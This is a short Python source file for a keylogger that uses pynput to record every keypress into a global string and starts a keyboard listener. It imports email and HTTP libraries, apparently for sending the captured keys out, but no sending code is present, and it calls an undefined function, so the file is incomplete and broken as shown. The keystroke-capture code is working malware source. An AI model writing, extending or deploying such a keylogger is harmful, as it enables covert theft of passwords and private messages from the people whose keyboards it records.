import pynput.keyboard
import smtplib
import threading
import requests
import json


thw_word = ""

def callback_function(key):
    global thw_word
    try:
        #log = log + key.char.encode('utf-8')
        thw_word = thw_word + str(key.char)
    except AttributeError:
        if key == key.space:
            thw_word = thw_word + " "
        else:
            thw_word = thw_word + str(key)
    except:
        pass


"""
"""



keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()

